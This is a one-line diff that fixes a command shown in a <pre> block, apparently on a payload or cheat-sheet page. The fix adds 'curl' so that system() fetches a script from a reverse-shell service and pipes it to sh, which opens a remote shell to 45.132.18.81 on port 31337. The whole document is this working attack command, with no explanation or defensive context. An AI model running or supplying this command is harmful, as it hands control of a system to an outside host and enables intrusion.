@@ -1,1 +1,1 @@
-<pre>system('https://shell.now.sh/45.132.18.81:31337 | sh')</pre>
+<pre>system('curl https://shell.now.sh/45.132.18.81:31337 | sh')</pre>
